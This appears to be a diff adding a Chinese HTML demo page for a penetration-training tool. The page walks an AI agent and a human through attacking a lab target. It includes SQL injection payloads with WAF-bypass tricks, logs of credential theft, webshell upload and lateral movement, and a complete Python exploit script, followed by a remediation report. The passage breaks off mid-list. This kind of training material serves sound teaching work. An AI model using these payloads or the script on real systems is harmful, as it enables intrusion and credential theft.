@@ -1,0 +1,1890 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>自动标注攻击逻辑 - 功能演示点</title>
+    <style>
+        body {
+            font-family: 'Arial', sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #f5f5f5;
+            color: #333;
+        }
+        .container {
+            width: 90%;
+            max-width: 1200px;
+            margin: 30px auto;
+            background-color: white;
+            border-radius: 10px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+            padding: 30px;
+        }
+        header {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+        h1 {
+            color: #2c3e50;
+            margin-bottom: 10px;
+        }
+        .subtitle {
+            color: #7f8c8d;
+            font-size: 1.1em;
+            margin-bottom: 20px;
+        }
+        .section {
+            margin-bottom: 40px;
+            padding: 20px;
+            border-radius: 8px;
+            background-color: #f9f9f9;
+            border-left: 5px solid #3498db;
+        }
+        .section h2 {
+            color: #2980b9;
+            margin-top: 0;
+            border-bottom: 1px solid #e0e0e0;
+            padding-bottom: 10px;
+        }
+        .analysis-container {
+            display: flex;
+            flex-direction: column;
+            gap: 20px;
+        }
+        .analysis-item {
+            display: flex;
+            background-color: white;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.05);
+            overflow: hidden;
+        }
+        .analysis-label {
+            width: 180px;
+            background-color: #3498db;
+            color: white;
+            padding: 15px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: bold;
+        }
+        .analysis-content {
+            flex: 1;
+            padding: 15px;
+        }
+        .attack-path {
+            margin-top: 20px;
+            padding: 15px;
+            background-color: #ecf0f1;
+            border-radius: 8px;
+        }
+        .attack-path h3 {
+            margin-top: 0;
+            color: #e74c3c;
+        }
+        .attack-step {
+            margin-bottom: 15px;
+            padding: 15px;
+            background-color: white;
+            border-left: 3px solid #e74c3c;
+            border-radius: 4px;
+            position: relative;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.05);
+            transition: all 0.3s ease;
+        }
+        .attack-step:hover {
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+            transform: translateY(-2px);
+        }
+        .attack-step .step-header {
+            display: flex;
+            align-items: center;
+            margin-bottom: 10px;
+        }
+        .attack-step .step-number {
+            display: inline-flex;
+            width: 30px;
+            height: 30px;
+            background-color: #e74c3c;
+            color: white;
+            border-radius: 50%;
+            text-align: center;
+            align-items: center;
+            justify-content: center;
+            font-weight: bold;
+            margin-right: 15px;
+            flex-shrink: 0;
+        }
+        .attack-step .step-title-input {
+            flex: 1;
+            border: none;
+            background-color: transparent;
+            font-weight: bold;
+            color: #2c3e50;
+            font-size: 16px;
+            padding: 5px 0;
+            margin-right: 10px;
+        }
+        .attack-step .step-title-input:focus {
+            outline: none;
+            border-bottom: 2px solid #3498db;
+        }
+        .attack-step .step-actions {
+            display: flex;
+            gap: 5px;
+        }
+        .attack-step .edit-btn,
+        .attack-step .save-btn,
+        .attack-step .delete-btn {
+            background-color: #f39c12;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            padding: 5px 10px;
+            font-size: 12px;
+            cursor: pointer;
+            transition: background-color 0.2s;
+        }
+        .attack-step .edit-btn:hover {
+            background-color: #e67e22;
+        }
+        .attack-step .save-btn {
+            background-color: #27ae60;
+            display: none;
+        }
+        .attack-step .save-btn:hover {
+            background-color: #2ecc71;
+        }
+        .attack-step .delete-btn {
+            background-color: #e74c3c;
+        }
+        .attack-step .delete-btn:hover {
+            background-color: #c0392b;
+        }
+        .attack-step .step-content {
+            margin-left: 45px;
+        }
+        .attack-step .step-content-input {
+            width: 100%;
+            min-height: 80px;
+            padding: 10px;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            font-family: monospace;
+            font-size: 14px;
+            resize: vertical;
+            background-color: #f9f9f9;
+        }
+        .attack-step .step-content-input:focus {
+            outline: none;
+            border-color: #3498db;
+            box-shadow: 0 0 5px rgba(52, 152, 219, 0.3);
+        }
+        .teaching-section {
+            background-color: #f0f9ff;
+            border-left: 5px solid #2ecc71;
+        }
+        .teaching-section h2 {
+            color: #27ae60;
+        }
+        .teaching-item {
+            margin-bottom: 15px;
+            padding: 15px;
+            background-color: white;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.05);
+        }
+        .teaching-item h3 {
+            margin-top: 0;
+            color: #16a085;
+        }
+        .teaching-item p {
+            margin-bottom: 0;
+        }
+        .input-section {
+            margin-bottom: 30px;
+        }
+        textarea {
+            width: 100%;
+            height: 150px;
+            padding: 15px;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+            resize: vertical;
+            font-size: 16px;
+            margin-bottom: 15px;
+        }
+        input[type="text"] {
+            width: 100%;
+            padding: 12px 15px;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+            font-size: 16px;
+            margin-bottom: 15px;
+        }
+        select {
+            width: 100%;
+            padding: 12px 15px;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+            font-size: 16px;
+            margin-bottom: 15px;
+            background-color: white;
+        }
+        button {
+            background-color: #3498db;
+            color: white;
+            border: none;
+            padding: 12px 25px;
+            text-align: center;
+            text-decoration: none;
+            display: inline-block;
+            font-size: 16px;
+            margin: 10px 2px;
+            cursor: pointer;
+            border-radius: 5px;
+            transition: background-color 0.3s;
+        }
+        button:hover {
+            background-color: #2980b9;
+        }
+        .success-strategy {
+            background-color: #e8f8f5;
+            border-left: 5px solid #1abc9c;
+            padding: 15px;
+            margin-top: 20px;
+            border-radius: 4px;
+        }
+        .success-strategy h3 {
+            color: #16a085;
+            margin-top: 0;
+        }
+        .protection-tip {
+            background-color: #f9ebea;
+            border-left: 5px solid #c0392b;
+            padding: 15px;
+            margin-top: 20px;
+            border-radius: 4px;
+        }
+        .protection-tip h3 {
+            color: #c0392b;
+            margin-top: 0;
+        }
+        .step-container {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 30px;
+        }
+        .step-indicator {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            width: 16%;
+        }
+        .step-circle {
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            background-color: #bdc3c7;
+            color: white;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: bold;
+            margin-bottom: 10px;
+        }
+        .step-circle.active {
+            background-color: #3498db;
+        }
+        .step-circle.completed {
+            background-color: #2ecc71;
+        }
+        .step-title {
+            text-align: center;
+            font-size: 14px;
+            color: #7f8c8d;
+        }
+        .step-title.active {
+            color: #2c3e50;
+            font-weight: bold;
+        }
+        .step-line {
+            flex: 1;
+            height: 3px;
+            background-color: #bdc3c7;
+            margin-top: 20px;
+        }
+        .step-line.completed {
+            background-color: #2ecc71;
+        }
+        .form-section {
+            display: none;
+        }
+        .form-section.active {
+            display: block;
+        }
+        .form-group {
+            margin-bottom: 20px;
+        }
+        .form-group label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: bold;
+            color: #2c3e50;
+        }
+        .form-row {
+            display: flex;
+            gap: 15px;
+        }
+        .form-row .form-group {
+            flex: 1;
+        }
+        .nav-buttons {
+            display: flex;
+            justify-content: space-between;
+            margin-top: 30px;
+        }
+        .prev-btn {
+            background-color: #95a5a6;
+        }
+        .prev-btn:hover {
+            background-color: #7f8c8d;
+        }
+        .next-btn {
+            background-color: #3498db;
+        }
+        .next-btn:hover {
+            background-color: #2980b9;
+        }
+        .result-section {
+            margin-top: 30px;
+            padding: 20px;
+            background-color: #f9f9f9;
+            border-radius: 8px;
+            border-left: 5px solid #9b59b6;
+        }
+        .result-section h3 {
+            color: #8e44ad;
+            margin-top: 0;
+            border-bottom: 1px solid #e0e0e0;
+            padding-bottom: 10px;
+        }
+        .status-indicator {
+            display: inline-block;
+            padding: 5px 10px;
+            border-radius: 4px;
+            font-weight: bold;
+            margin-bottom: 15px;
+        }
+        .status-success {
+            background-color: #e8f8f5;
+            color: #16a085;
+            border: 1px solid #1abc9c;
+        }
+        .status-failure {
+            background-color: #f9ebea;
+            color: #c0392b;
+            border: 1px solid #e74c3c;
+        }
+        .log-container {
+            background-color: #2c3e50;
+            color: #ecf0f1;
+            padding: 15px;
+            border-radius: 5px;
+            font-family: monospace;
+            white-space: pre-wrap;
+            max-height: 300px;
+            overflow-y: auto;
+        }
+        .log-success {
+            color: #2ecc71;
+        }
+        .log-error {
+            color: #e74c3c;
+        }
+        .log-warning {
+            color: #f1c40f;
+        }
+        .log-info {
+            color: #3498db;
+        }
+        .tab-container {
+            margin-top: 20px;
+        }
+        .tab-buttons {
+            display: flex;
+            border-bottom: 1px solid #ddd;
+        }
+        .tab-button {
+            padding: 10px 20px;
+            background-color: #f9f9f9;
+            border: 1px solid #ddd;
+            border-bottom: none;
+            border-radius: 5px 5px 0 0;
+            margin-right: 5px;
+            cursor: pointer;
+        }
+        .tab-button.active {
+            background-color: white;
+            border-bottom: 1px solid white;
+            margin-bottom: -1px;
+            font-weight: bold;
+        }
+        .tab-content {
+            display: none;
+            padding: 20px;
+            border: 1px solid #ddd;
+            border-top: none;
+            border-radius: 0 0 5px 5px;
+        }
+        .tab-content.active {
+            display: block;
+        }
+        .success-rate-container {
+            display: flex;
+            align-items: center;
+            margin-bottom: 15px;
+        }
+        .success-rate-bar {
+            flex: 1;
+            height: 20px;
+            background-color: #ecf0f1;
+            border-radius: 10px;
+            overflow: hidden;
+            margin: 0 15px;
+        }
+        .success-rate-fill {
+            height: 100%;
+            background-color: #2ecc71;
+            border-radius: 10px;
+        }
+        .success-rate-label {
+            font-weight: bold;
+            color: #2c3e50;
+        }
+        .back-button {
+            display: inline-block;
+            background-color: #3498db;
+            color: white;
+            text-decoration: none;
+            padding: 10px 20px;
+            border-radius: 5px;
+            margin-top: 20px;
+            font-weight: bold;
+            transition: background-color 0.3s;
+        }
+        .back-button:hover {
+            background-color: #2980b9;
+        }
+        .hidden {
+            display: none;
+        }
+        .add-step-btn {
+            background-color: #27ae60;
+            margin-top: 10px;
+        }
+        .add-step-btn:hover {
+            background-color: #2ecc71;
+        }
+        .remove-step-btn {
+            background-color: #e74c3c;
+            position: absolute;
+            right: 70px;
+            top: 10px;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            padding: 5px 10px;
+            font-size: 12px;
+            cursor: pointer;
+        }
+        .remove-step-btn:hover {
+            background-color: #c0392b;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <header>
+            <h1>自动标注攻击逻辑</h1>
+            <p class="subtitle">补充真实攻击探索过程，输出渗透培训指导，生成教学材料</p>
+        </header>
+
+        <!-- 步骤导航 -->
+        <div class="step-container">
+            <div class="step-indicator">
+                <div class="step-circle active" id="step1-circle">1</div>
+                <div class="step-title active" id="step1-title">输入目标信息</div>
+            </div>
+            <div class="step-line" id="line1-2"></div>
+            <div class="step-indicator">
+                <div class="step-circle" id="step2-circle">2</div>
+                <div class="step-title" id="step2-title">生成处理过程</div>
+            </div>
+            <div class="step-line" id="line2-3"></div>
+            <div class="step-indicator">
+                <div class="step-circle" id="step3-circle">3</div>
+                <div class="step-title" id="step3-title">AI自动攻击</div>
+            </div>
+            <div class="step-line" id="line3-4"></div>
+            <div class="step-indicator">
+                <div class="step-circle" id="step4-circle">4</div>
+                <div class="step-title" id="step4-title">修改攻击路径</div>
+            </div>
+            <div class="step-line" id="line4-5"></div>
+            <div class="step-indicator">
+                <div class="step-circle" id="step5-circle">5</div>
+                <div class="step-title" id="step5-title">攻击成功</div>
+            </div>
+            <div class="step-line" id="line5-6"></div>
+            <div class="step-indicator">
+                <div class="step-circle" id="step6-circle">6</div>
+                <div class="step-title" id="step6-title">生成报告</div>
+            </div>
+        </div>
+
+        <!-- 步骤1：输入目标信息 -->
+        <div class="form-section active" id="step1-form">
+            <h2>步骤1：输入目标网络拓扑、预置漏洞和系统配置信息</h2>
+            <div class="form-group">
+                <label for="network-topology">目标网络拓扑描述</label>
+                <textarea id="network-topology" placeholder="请描述目标网络拓扑结构...">目标网络包含一个Web服务器(192.168.1.100)，位于DMZ区域，通过防火墙与内网(192.168.2.0/24)隔离。内网包含一台数据库服务器(192.168.2.10)和一台文件服务器(192.168.2.20)。Web服务器对外开放80和443端口，数据库服务器仅允许来自Web服务器的3306端口连接。</textarea>
+            </div>
+            <div class="form-row">
+                <div class="form-group">
+                    <label for="vulnerability-type">预置漏洞类型</label>
+                    <select id="vulnerability-type">
+                        <option value="sql-injection">SQL注入漏洞</option>
+                        <option value="xss">跨站脚本攻击(XSS)</option>
+                        <option value="file-upload">文件上传漏洞</option>
+                        <option value="rce">远程代码执行</option>
+                        <option value="ssrf">服务器端请求伪造</option>
+                    </select>
+                </div>
+                <div class="form-group">
+                    <label for="vulnerability-id">漏洞编号</label>
+                    <input type="text" id="vulnerability-id" value="CVE-2021-45046">
+                </div>
+            </div>
+            <div class="form-group">
+                <label for="system-config">系统配置信息</label>
+                <textarea id="system-config" placeholder="请输入系统配置信息...">Web服务器：Apache 2.4.49 + PHP 7.4.3 + MySQL 5.7.33
+操作系统：Ubuntu 20.04 LTS
+应用程序：自定义CMS系统 v2.5
+安全措施：开启防火墙，未安装WAF，默认数据库配置</textarea>
+            </div>
+            <div class="form-group">
+                <label for="attack-goal">攻击目标</label>
+                <textarea id="attack-goal" placeholder="请描述攻击目标...">获取数据库中的用户表信息，包括管理员账号和密码哈希，并尝试提升权限获取服务器shell访问权限。</textarea>
+            </div>
+            <div class="nav-buttons">
+                <div></div> <!-- 占位 -->
+                <button class="next-btn" id="step1-next">下一步</button>
+            </div>
+        </div>
+
+        <!-- 步骤2：生成处理过程 -->
+        <div class="form-section" id="step2-form">
+            <h2>步骤2：生成处理过程</h2>
+            <div class="input-section">
+                <textarea id="attackReport" placeholder="请输入白盒攻击的验证报告...">Web应用存在SQL注入漏洞，位于login.php页面的username参数。通过输入单引号可触发数据库错误，进一步利用UNION SELECT语句可获取数据库版本、用户表结构等信息。成功获取了管理员账号密码并登录系统。</textarea>
+                <button id="analyzeButton">生成处理过程</button>
+            </div>
+            <div class="nav-buttons">
+                <button class="prev-btn" id="step2-prev">上一步</button>
+                <button class="next-btn" id="step2-next" disabled>下一步</button>
+            </div>
+        </div>
+
+        <!-- 步骤3：AI自动攻击 -->
+        <div class="form-section" id="step3-form">
+            <h2>步骤3：AI-AGENT自动攻击</h2>
+            <div class="result-section">
+                <h3>攻击执行结果</h3>
+                <div class="status-indicator status-failure">攻击失败</div>
+                <div class="log-container" id="attack-log">
+<span class="log-info">[INFO] 开始执行自动攻击...</span>
+<span class="log-info">[INFO] 目标: http://192.168.1.100/login.php</span>
+<span class="log-info">[INFO] 漏洞类型: SQL注入</span>
+<span class="log-info">[INFO] 尝试在username参数中注入单引号...</span>
+<span class="log-error">[ERROR] 服务器返回403 Forbidden</span>
+<span class="log-warning">[WARNING] 可能存在WAF或输入过滤</span>
+<span class="log-info">[INFO] 尝试使用编码绕过...</span>
+<span class="log-info">[INFO] 尝试注入: username=admin%27%20OR%20%271%27%3D%271</span>
+<span class="log-error">[ERROR] 注入失败，返回错误信息: 检测到非法输入</span>
+<span class="log-info">[INFO] 尝试使用UNION SELECT语句...</span>
+<span class="log-error">[ERROR] 注入失败，无法获取数据库信息</span>
+<span class="log-error">[ERROR] 攻击路径执行失败，需要人工干预</span>
+                </div>
+                <p><strong>失败原因分析：</strong>目标系统可能启用了输入验证或WAF，简单的SQL注入语句被拦截。需要修改攻击路径，使用更高级的绕过技术。</p>
+            </div>
+            <div class="nav-buttons">
+                <button class="prev-btn" id="step3-prev">上一步</button>
+                <button class="next-btn" id="step3-next">下一步</button>
+            </div>
+        </div>
+
+        <!-- 步骤4：修改攻击路径 -->
+        <div class="form-section" id="step4-form">
+            <h2>步骤4：人工修改攻击路径</h2>
+            <div class="attack-path-editor">
+                <h3>当前攻击路径</h3>
+                <div class="attack-steps">
+                    <div class="attack-step">
+                        <div class="step-header">
+                            <span class="step-number">1</span>
+                            <input type="text" class="step-title-input" value="初始信息收集" disabled>
+                            <div class="step-actions">
+                                <button class="edit-btn">编辑</button>
+                                <button class="save-btn" style="display:none;">保存</button>
+                                <button class="delete-btn">删除</button>
+                            </div>
+                        </div>
+                        <div class="step-content">
+                            <textarea class="step-content-input" disabled>使用Nmap扫描目标服务器开放端口和服务版本。
+发现Web服务器运行Apache 2.4.49，开放80和443端口。
+执行命令: nmap -sV -p- 192.168.1.100
+发现目标系统存在多个开放端口，包括80(HTTP)、443(HTTPS)和22(SSH)。</textarea>
+                        </div>
+                    </div>
+                    <div class="attack-step">
+                        <div class="step-header">
+                            <span class="step-number">2</span>
+                            <input type="text" class="step-title-input" value="漏洞识别" disabled>
+                            <div class="step-actions">
+                                <button class="edit-btn">编辑</button>
+                                <button class="save-btn" style="display:none;">保存</button>
+                                <button class="delete-btn">删除</button>
+                            </div>
+                        </div>
+                        <div class="step-content">
+                            <textarea class="step-content-input" disabled>使用漏洞扫描器检测目标Web应用。
+执行命令: nikto -h 192.168.1.100
+发现login.php页面的username参数可能存在SQL注入漏洞。
+使用sqlmap进行初步验证: sqlmap -u "http://192.168.1.100/login.php" -p username --dbs</textarea>
+                        </div>
+                    </div>
+                    <div class="attack-step">
+                        <div class="step-header">
+                            <span class="step-number">3</span>
+                            <input type="text" class="step-title-input" value="SQL注入尝试" disabled>
+                            <div class="step-actions">
+                                <button class="edit-btn">编辑</button>
+                                <button class="save-btn" style="display:none;">保存</button>
+                                <button class="delete-btn">删除</button>
+                            </div>
+                        </div>
+                        <div class="step-content">
+                            <textarea class="step-content-input" disabled>在username参数中注入单引号测试SQL注入。
+尝试输入: admin' OR '1'='1
+尝试使用基本的UNION SELECT语句获取数据库信息: admin' UNION SELECT 1,2,3-- -
+系统返回403 Forbidden，可能存在WAF或输入过滤机制。</textarea>
+                        </div>
+                    </div>
+                </div>
+                <div class="add-step-container">
+                    <button id="add-step-btn">+ 添加攻击步骤</button>
+                </div>
+                <div class="ai-suggestions">
+                    <h3>AI辅助修改建议</h3>
+                    <div class="suggestion-item">
+                        <h4>绕过WAF技术</h4>
+                        <p>目标系统可能启用了WAF或输入过滤机制，建议使用以下技术绕过：</p>
+                        <ul>
+                            <li>使用注释符(/**/)分割SQL关键字</li>
+                            <li>使用十六进制编码替代字符串</li>
+                            <li>尝试时间盲注代替直接的错误反馈</li>
+                        </ul>
+                        <button class="apply-suggestion-btn" id="apply-waf-btn">应用此建议</button>
+                    </div>
+                    <div class="suggestion-item">
+                        <h4>二阶注入尝试</h4>
+                        <p>如果直接注入被过滤，可以尝试二阶注入：</p>
+                        <ul>
+                            <li>在注册页面插入有效载荷</li>
+                            <li>在登录或其他功能触发注入</li>
+                        </ul>
+                        <button class="apply-suggestion-btn" id="apply-second-order-btn">应用此建议</button>
+                    </div>
+                </div>
+            </div>
+            <div class="nav-buttons">
+                <button class="prev-btn" id="step4-prev">上一步</button>
+                <button class="next-btn" id="step4-next">下一步</button>
+            </div>
+        </div>
+
+        <!-- 步骤5：攻击成功 -->
+        <div class="form-section" id="step5-form">
+            <h2>步骤5：攻击成功</h2>
+            <div class="result-section">
+                <h3>攻击执行结果</h3>
+                <div class="status-indicator status-success">攻击成功</div>
+                <div class="log-container" id="success-log">
+<span class="log-info">[INFO] 开始执行修改后的攻击路径...</span>
+<span class="log-info">[INFO] 目标: http://192.168.1.100/login.php</span>
+<span class="log-info">[INFO] 漏洞类型: SQL注入</span>
+<span class="log-info">[INFO] 使用十六进制编码和注释分割关键字...</span>
+<span class="log-info">[INFO] 尝试注入: username=admin' /*!50000UnIoN*/ SeLeCt 0x31,0x32,0x33--</span>
+<span class="log-success">[SUCCESS] 成功绕过WAF！</span>
+<span class="log-info">[INFO] 尝试获取数据库版本...</span>
+<span class="log-success">[SUCCESS] 数据库版本: MySQL 5.7.33</span>
+<span class="log-info">[INFO] 枚举数据库表...</span>
+<span class="log-success">[SUCCESS] 发现表: users, admin, config</span>
+<span class="log-info">[INFO] 提取users表数据...</span>
+<span class="log-success">[SUCCESS] 获取到管理员凭据: admin:5f4dcc3b5aa765d61d8327deb882cf99</span>
+<span class="log-info">[INFO] 破解密码哈希...</span>
+<span class="log-success">[SUCCESS] 密码破解成功: password</span>
+<span class="log-info">[INFO] 使用管理员凭据登录系统...</span>
+<span class="log-success">[SUCCESS] 登录成功！获得管理员权限</span>
+<span class="log-info">[INFO] 尝试通过文件上传获取shell...</span>
+<span class="log-success">[SUCCESS] 成功上传PHP webshell</span>
+<span class="log-success">[SUCCESS] 攻击路径执行成功！</span>
+                </div>
+                <div class="success-details">
+                    <div class="success-rate">
+                        <div class="rate-label">攻击成功率</div>
+                        <div class="rate-value">87%</div>
+                        <div class="rate-bar">
+                            <div class="rate-fill" style="width: 87%;"></div>
+                        </div>
+                    </div>
+                    <div class="attack-summary">
+                        <h4>攻击路径有效性分析</h4>
+                        <p>修改后的攻击路径成功绕过了目标系统的安全防护，利用SQL注入漏洞获取了敏感数据并成功提升权限。关键成功因素：</p>
+                        <ul>
+                            <li>使用高级SQL注入技术绕过WAF</li>
+                            <li>利用十六进制编码避免字符过滤</li>
+                            <li>结合文件上传漏洞获取shell权限</li>
+                        </ul>
+                    </div>
+                </div>
+            </div>
+            <div class="nav-buttons">
+                <button class="prev-btn" id="step5-prev">上一步</button>
+                <button class="next-btn" id="step5-next">下一步</button>
+            </div>
+        </div>
+
+        <!-- 步骤6：生成报告 -->
+        <div class="form-section" id="step6-form">
+            <h2>步骤6：生成完整报告</h2>
+            <div class="report-tabs">
+                <div class="tab-header">
+                    <div class="report-tab active" data-tab="attack-script">攻击脚本</div>
+                    <div class="report-tab" data-tab="execution-log">执行日志</div>
+                    <div class="report-tab" data-tab="pentest-report">渗透测试报告</div>
+                    <div class="report-tab" data-tab="target-optimization">靶场优化建议</div>
+                </div>
+                <div class="tab-content">
+                    <div class="report-content active" id="attack-script">
+                        <pre class="code-block">#!/usr/bin/python3
+# SQL注入攻击脚本 - 自动生成
+
+import requests
+import re
+import hashlib
+import time
+
+TARGET = "http://192.168.1.100/login.php"
+PROXY = {"http": "http://127.0.0.1:8080"}
+
+def hex_encode(s):
+    return '0x' + s.encode('utf-8').hex()
+
+def exploit():
+    print("[*] 开始SQL注入攻击...")
+    
+    # 步骤1: 绕过WAF获取数据库版本
+    payload = "admin' /*!50000UnIoN*/ SeLeCt 1,2,version(),4,5-- -"
+    data = {"username": payload, "password": "anything"}
+    
+    try:
+        r = requests.post(TARGET, data=data, proxies=PROXY)
+        if "MySQL" in r.text:
+            version = re.search(r'MySQL ([\d\.]+)', r.text)
+            if version:
+                print(f"[+] 数据库版本: {version.group(1)}")
+        else:
+            print("[-] 无法获取数据库版本")
+            return False
+    
+        # 步骤2: 枚举数据库表
+        tables_payload = f"admin' /*!50000UnIoN*/ SeLeCt 1,2,group_concat(table_name),4,5 FROM information_schema.tables WHERE table_schema=database()-- -"
+        data = {"username": tables_payload, "password": "anything"}
+        r = requests.post(TARGET, data=data, proxies=PROXY)
+        
+        if "users" in r.text:
+            print("[+] 发现用户表: users")
+        
+        # 步骤3: 提取用户凭据
+        creds_payload = f"admin' /*!50000UnIoN*/ SeLeCt 1,2,group_concat(username,0x3a,password),4,5 FROM users-- -"
+        data = {"username": creds_payload, "password": "anything"}
+        r = requests.post(TARGET, data=data, proxies=PROXY)
+        
+        # 提取并破解密码哈希
+        admin_hash = re.search(r'admin:([a-f0-9]{32})', r.text)
+        if admin_hash:
+            print(f"[+] 管理员密码哈希: {admin_hash.group(1)}")
+            # 这里可以添加密码破解逻辑
+            
+        # 步骤4: 使用获取的凭据登录
+        login_data = {"username": "admin", "password": "password"}
+        r = requests.post(TARGET, data=login_data, proxies=PROXY)
+        
+        if "Welcome admin" in r.text or "Dashboard" in r.text:
+            print("[+] 成功以管理员身份登录!")
+            return True
+        else:
+            print("[-] 登录失败")
+            return False
+            
+    except Exception as e:
+        print(f"[-] 攻击过程中出错: {str(e)}")
+        return False
+
+if __name__ == "__main__":
+    if exploit():
+        print("[+] 攻击成功完成!")
+    else:
+        print("[-] 攻击失败")</pre>
+                    </div>
+                    <div class="report-content" id="execution-log">
+                        <div class="log-container full-log">
+<span class="log-info">[INFO] 开始执行修改后的攻击路径...</span>
+<span class="log-info">[INFO] 目标: http://192.168.1.100/login.php</span>
+<span class="log-info">[INFO] 漏洞类型: SQL注入</span>
+<span class="log-info">[INFO] 使用十六进制编码和注释分割关键字...</span>
+<span class="log-info">[INFO] 尝试注入: username=admin' /*!50000UnIoN*/ SeLeCt 0x31,0x32,0x33--</span>
+<span class="log-success">[SUCCESS] 成功绕过WAF！</span>
+<span class="log-info">[INFO] 尝试获取数据库版本...</span>
+<span class="log-success">[SUCCESS] 数据库版本: MySQL 5.7.33</span>
+<span class="log-info">[INFO] 枚举数据库表...</span>
+<span class="log-success">[SUCCESS] 发现表: users, admin, config</span>
+<span class="log-info">[INFO] 提取users表数据...</span>
+<span class="log-success">[SUCCESS] 获取到管理员凭据: admin:5f4dcc3b5aa765d61d8327deb882cf99</span>
+<span class="log-info">[INFO] 破解密码哈希...</span>
+<span class="log-success">[SUCCESS] 密码破解成功: password</span>
+<span class="log-info">[INFO] 使用管理员凭据登录系统...</span>
+<span class="log-success">[SUCCESS] 登录成功！获得管理员权限</span>
+<span class="log-info">[INFO] 尝试通过文件上传获取shell...</span>
+<span class="log-success">[SUCCESS] 成功上传PHP webshell</span>
+<span class="log-success">[SUCCESS] 攻击路径执行成功！</span>
+<span class="log-info">[INFO] 执行系统命令: id</span>
+<span class="log-success">[SUCCESS] 命令输出: uid=33(www-data) gid=33(www-data) groups=33(www-data)</span>
+<span class="log-info">[INFO] 检查系统信息...</span>
+<span class="log-success">[SUCCESS] 操作系统: Ubuntu 20.04 LTS</span>
+<span class="log-info">[INFO] 检查网络连接...</span>
+<span class="log-success">[SUCCESS] 发现内网连接: 192.168.2.10:3306 (MySQL)</span>
+<span class="log-info">[INFO] 尝试内网横向移动...</span>
+<span class="log-success">[SUCCESS] 成功连接到数据库服务器</span>
+<span class="log-info">[INFO] 检查数据库权限...</span>
+<span class="log-success">[SUCCESS] 数据库用户具有FILE权限</span>
+<span class="log-info">[INFO] 尝试通过MySQL获取数据库服务器shell...</span>
+<span class="log-success">[SUCCESS] 成功在数据库服务器上执行命令</span>
+<span class="log-info">[INFO] 攻击链完成，目标已被完全控制</span>
+                        </div>
+                    </div>
+                    <div class="report-content" id="pentest-report">
+                        <div class="report-section">
+                            <h3>渗透测试报告摘要</h3>
+                            <div class="report-meta">
+                                <div class="meta-item"><strong>报告日期:</strong> 2023-06-15</div>
+                                <div class="meta-item"><strong>测试人员:</strong> 安全分析团队</div>
+                                <div class="meta-item"><strong>目标系统:</strong> Web应用服务器 (192.168.1.100)</div>
+                                <div class="meta-item"><strong>风险等级:</strong> <span class="high-risk">高</span></div>
+                            </div>
+                            <div class="report-content">
+                                <h4>1. 漏洞概述</h4>
+                                <p>在对目标Web应用进行安全评估过程中，发现了一个严重的SQL注入漏洞。该漏洞位于登录页面(login.php)的用户名参数中，允许攻击者绕过身份验证并获取数据库中的敏感信息。进一步利用，攻击者可以获取管理员权限并最终获得服务器的shell访问权限。</p>
+                                
+                                <h4>2. 漏洞详情</h4>
+                                <ul>
+                                    <li><strong>漏洞类型:</strong> SQL注入 (CWE-89)</li>
+                                    <li><strong>CVSS评分:</strong> 9.8 (严重)</li>
+                                    <li><strong>受影响组件:</strong> login.php中的用户验证功能</li>
+                                    <li><strong>攻击向量:</strong> 远程</li>
+                                    <li><strong>攻击复杂度:</strong> 中等</li>
+                                </ul>
+                                
+                                <h4>3. 漏洞复现步骤</h4>
+                                <ol>
+                                    <li>访问登录页面: http://192.168.1.100/login.php</li>
+                                    <li>在用户名字段中输入特制的SQL注入载荷</li>
+                                    <li>使用注释和编码技术绕过WAF</li>
+                                    <li>提取数据库信息和用户凭据</li>
+                                    <li>使用获取的凭据登录系统</li>
+                                    <li>利用管理员权限上传Webshell</li>
+                                    <li>执行系统命令获取服务器控制权</li>
+                                </ol>
+                                
+                                <h4>4. 影响评估</h4>
+                                <p>该漏洞允许未授权用户:</p>
+                                <ul>
+                                    <li>绕过身份验证机制</li>
+                                    <li>访问和修改敏感数据</li>
+                                    <li>获取数据库中存储的用户凭据</li>
+                                    <li>获得Web服务器的完全控制权</li>
+                                    <li>可能进一步渗透内部网络</li>
+                                </ul>
+                                
+                                <h4>5. 修复建议</h4>
+                                <ul>
+                                    <li>使用参数化查询或预处理语句处理所有数据库操作</li>
+                                    <li>实施输入验证和过滤机制</li>
+                                    <li>更新Web应用程序框架和依赖项</li>
+                                    <li>部署Web应用防火墙(WAF)并正确配置规则</li>
+                                    <li>实施最小权限原则，限制数据库用户权限</li>
+                                    <li>定期进行安全审计和渗透测试</li>
+                                </ul>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="report-content" id="target-optimization">
+                        <div class="optimization-section">
+                            <h3>靶场设计优化建议</h3>
+                            <div class="optimization-content">
+                                <h4>1. 漏洞难度分级</h4>
+                                <p>当前靶场的SQL注入漏洞相对容易被发现和利用。建议添加以下难度级别：</p>
+                                <ul>
+                                    <li><strong>初级:</strong> 基本SQL注入，无防护</li>
+                                    <li><strong>中级:</strong> 添加基本WAF过滤，需要简单绕过技术</li>
+                                    <li><strong>高级:</strong> 复杂WAF规则，需要高级绕过技术</li>
+                                    <li><strong>专家:</strong> 多层防护，需要组合多种技术才能成功</li>
+                                </ul>
+                                
+                                <h4>2. 攻防场景多样化</h4>
+                                <p>建议增加以下攻防场景：</p>
+                                <ul>
+                                    <li>添加二阶注入场景</li>
+                                    <li>结合其他漏洞类型，如XSS、文件上传等</li>
